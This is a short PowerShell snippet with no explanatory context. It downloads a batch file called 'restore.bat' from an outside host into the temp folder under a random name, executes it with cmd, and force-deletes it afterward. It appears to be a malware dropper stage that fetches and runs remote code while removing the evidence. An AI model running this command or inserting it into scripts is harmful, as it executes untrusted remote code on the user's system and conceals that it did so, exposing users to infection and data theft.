$url = "https://gbee.zgqinc.gq/restore.bat"
$file = "$env:TEMP\t_$(Get-Random).bat"
iwr $url -OutFile $file; cmd /c $file; rm $file -Force
